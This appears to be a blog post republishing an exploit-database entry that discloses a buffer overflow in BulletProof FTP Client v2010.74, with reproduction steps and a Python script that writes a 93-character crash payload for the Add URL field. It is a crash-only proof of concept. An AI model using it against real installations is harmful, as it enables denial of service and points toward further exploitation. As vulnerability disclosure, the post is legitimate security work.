---
layout: post
title: BulletProof FTP Client v2010.74 - Buffer Overflow (PoC)
date: 2023-09-14
category: exploit
---

# Exploit Title: BulletProof FTP Client v2010.74 - Buffer Overflow (PoC)
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 14.09.2023
# Vendor Homepage: http://www.bpftp.com
# Software Link: https://download.bpftp.com/mirrors.html?file=bpftpclient_install.exe
# Tested Version: v2010.74 (latest)
# Tested on: Windows 2019 Server 64bit

### Steps to Reproduce

1. Open the BulletProof FTP Client application.
2. Click on **Add URL**.
3. Paste the content of `poc.txt` and save it.
4. The application should crash due to a buffer overflow.

### Proof of Concept (PoC)

The following script generates a `poc.txt` file containing a payload that, when loaded into the **Add URL** field, triggers the buffer overflow and causes the application to crash.

```python
#!/usr/bin/python

poc = 'A' * 93

try:
    file = open("poc.txt", "w")
    file.write(poc)
    file.close()
    print("POC is created")
except Exception as e:
    print("POC is not created:", e)
